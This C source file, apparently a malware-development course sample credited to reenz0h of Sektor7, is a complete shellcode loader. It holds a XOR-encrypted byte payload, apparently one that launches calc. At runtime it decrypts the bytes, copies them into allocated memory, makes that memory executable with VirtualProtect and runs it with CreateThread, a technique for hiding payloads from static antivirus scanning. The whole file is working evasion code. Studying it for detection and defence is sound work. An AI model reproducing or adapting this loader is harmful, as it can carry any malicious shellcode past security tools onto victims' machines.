 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char calc_payload[] = { 0x91, 0x91, 0xf1, 0x65, 0x63, 0x72, 0x5, 0xfd, 0x8e, 0x54, 0xa5, 0x1, 0xe6, 0x29, 0x43, 0xee, 0x31, 0x7e, 0xee, 0x26, 0x7f, 0xee, 0x17, 0x4d, 0x62, 0xce, 0x39, 0x43, 0x52, 0x8d, 0xc9, 0x48, 0xa, 0x19, 0x67, 0x49, 0x4d, 0xb8, 0xbc, 0x68, 0x62, 0xb5, 0x87, 0x86, 0x39, 0x32, 0xee, 0x37, 0x7d, 0xf2, 0x39, 0x59, 0xe8, 0x3e, 0x74, 0xc, 0x88, 0x2d, 0x64, 0xb4, 0x3c, 0xf2, 0x2a, 0x45, 0x62, 0xa1, 0xee, 0x3d, 0x73, 0x86, 0x5f, 0x2c, 0xe6, 0x4d, 0xf8, 0x64, 0xb5, 0x43, 0x9a, 0xd8, 0xaa, 0xaa, 0x68, 0x64, 0xaa, 0x41, 0x93, 0x10, 0x95, 0x71, 0x18, 0x8c, 0x50, 0x18, 0x41, 0x10, 0x89, 0x21, 0xf8, 0x3d, 0x47, 0x73, 0xb6, 0x12, 0xe0, 0x69, 0x2e, 0xee, 0x35, 0x65, 0x72, 0xb6, 0xe8, 0x76, 0xee, 0x75, 0xbb, 0xec, 0x21, 0x41, 0x49, 0x22, 0x28, 0x4, 0x3a, 0x28, 0x34, 0x8b, 0x8b, 0x3a, 0x3a, 0x3f, 0xe6, 0x6b, 0x98, 0xe8, 0x3e, 0x18, 0x64, 0xf9, 0xee, 0xd7, 0x65, 0x65, 0x6d, 0x29, 0x1b, 0x54, 0xe8, 0x1d, 0xe2, 0x8b, 0xbe, 0xde, 0x95, 0xd0, 0xcf, 0x2f, 0x1b, 0xc3, 0xf6, 0xcf, 0xf8, 0x8b, 0xbe, 0x59, 0x63, 0x19, 0x67, 0xf9, 0x88, 0x85, 0x16, 0x77, 0xde, 0x33, 0x78, 0x17, 0xa, 0xf, 0x6d, 0x2a, 0x8c, 0xb0, 0x0, 0x13, 0x9, 0x17, 0x45, 0x0, 0x1d, 0x0, 0x6d };
unsigned int calc_len = sizeof(calc_payload);
char key[] = "mysecretkeee";


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;


	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt (DeXOR) the payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
